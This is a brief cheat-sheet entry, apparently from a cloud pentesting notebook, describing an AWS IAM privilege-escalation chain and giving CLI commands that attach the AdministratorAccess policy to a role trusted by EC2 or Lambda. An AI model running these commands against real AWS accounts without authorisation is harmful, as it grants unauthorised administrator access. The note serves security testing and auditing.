# IAM

## 1. permission escalation
Attach Policy `AdministratorAccess` -> Attach to Role ( with trust relation ship to `EC2` or `Lambda` ) -> Create `EC2` or `Lambda` -> Attach `AdministratorAccess` to user

Attach policy to role:
```
iam attach-role-policy --role-name <value> --policy-arn <value>
```
```
iam attach-role-policy --role-name administrator --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
